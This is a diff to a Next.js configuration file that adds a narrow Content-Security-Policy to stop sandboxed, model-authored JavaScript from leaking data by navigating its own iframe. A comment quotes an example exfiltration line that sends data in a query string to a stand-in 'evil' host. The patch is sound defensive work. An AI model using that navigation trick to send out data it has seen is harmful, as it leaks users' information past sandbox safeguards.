@@ -1,3 +1,15 @@
+/**
+ * Origin the HTML-artifact preview iframe loads signed URLs from. Read here so
+ * the CSP below can name it instead of falling back to a blanket `https:`.
+ */
+const storageOrigin = (() => {
+  try {
+    return new URL(process.env.NEXT_PUBLIC_SUPABASE_URL ?? '').origin;
+  } catch {
+    return '';
+  }
+})();
+
 /** @type {import('next').NextConfig} */
 const nextConfig = {
   reactStrictMode: true,
@@ -51,6 +63,37 @@ const nextConfig = {
           // this origin, and DENY has broken same-origin embedding in the past.
           { key: 'X-Frame-Options', value: 'SAMEORIGIN' },
           { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
+          // A deliberately narrow CSP, covering the frames only.
+          //
+          // `run_js` and the code sandbox run model-authored JavaScript in a
+          // srcdoc iframe with `sandbox="allow-scripts"` and a guest policy of
+          // `default-src 'none'`, and the docs there promise "nothing connects".
+          // That promise had a hole: neither the sandbox attribute nor the
+          // guest's own policy restricts the frame NAVIGATING ITSELF, so guest
+          // code could put whatever it had been shown into a query string and
+          // send it anywhere with `location.href = 'https://evil/?d=…'`.
+          // Verified against headless Chromium: without this the request lands
+          // on the attacker's server; with it the navigation is blocked while
+          // the srcdoc guest still loads and still runs.
+          //
+          // `data:` and the storage origin are here because the HTML-artifact
+          // preview iframe loads exactly those two: a data: URL in guest mode,
+          // a Supabase signed URL when signed in. `frame-src 'self'` alone
+          // silently blanks that preview.
+          //
+          // script-src/style-src are deliberately absent: `experimental.inlineCss`
+          // and Next's own inline bootstrap need either 'unsafe-inline' (which
+          // buys nothing) or a nonce on every injected tag, which is a much
+          // larger change than this fix.
+          {
+            key: 'Content-Security-Policy',
+            value: [
+              `frame-src 'self' data:${storageOrigin ? ` ${storageOrigin}` : ''}`,
+              // Nothing in the app uses <object>/<embed> or <base>.
+              "object-src 'none'",
+              "base-uri 'self'",
+            ].join('; '),
+          },
         ],
       },
       {
@@ -64,7 +107,8 @@ const nextConfig = {
         // revalidated on every cold load. Named explicitly rather than matched
         // by extension so `sw.js` is never caught by it — a long-cached service
         // worker is a service worker you cannot update.
-        source: '/:file(icon.svg|apple-touch-icon.png|icon-192.png|icon-512.png|icon-192-maskable.png|icon-512-maskable.png)',
+        source:
+          '/:file(icon.svg|apple-touch-icon.png|icon-192.png|icon-512.png|icon-192-maskable.png|icon-512-maskable.png)',
         headers: [{ key: 'Cache-Control', value: 'public, max-age=604800, must-revalidate' }],
       },
     ];
